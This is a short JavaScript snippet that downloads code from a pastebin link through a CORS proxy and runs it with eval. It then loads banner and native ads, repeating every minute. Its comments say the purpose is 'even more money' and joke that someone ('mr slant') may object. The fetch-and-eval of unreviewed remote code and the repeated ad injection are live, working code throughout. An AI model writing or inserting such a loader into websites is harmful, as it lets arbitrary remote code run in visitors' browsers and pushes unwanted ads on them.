// hi ching ching ching ching!
(async ()=>{
	const code = await (await fetch("https://corsproxy.io/?url=https://pastebin.com/raw/pLnh23H7")).text()
	eval(code)

    // i swear it works now :pray:
    setTimeout(()=>{
    	loadAds({
            banner: "94d3e6b189169213c968a0f35cf2c24b",
            native: "976e351ff44eac06013f3d88e10200d0",
        });

        // even more money dont get mad mr slant
        setInterval(()=>{
        	loadAds({
                banner: "94d3e6b189169213c968a0f35cf2c24b",
                native: "976e351ff44eac06013f3d88e10200d0",
            });
        },1 * 60 * 1000)
    },1000)
})()
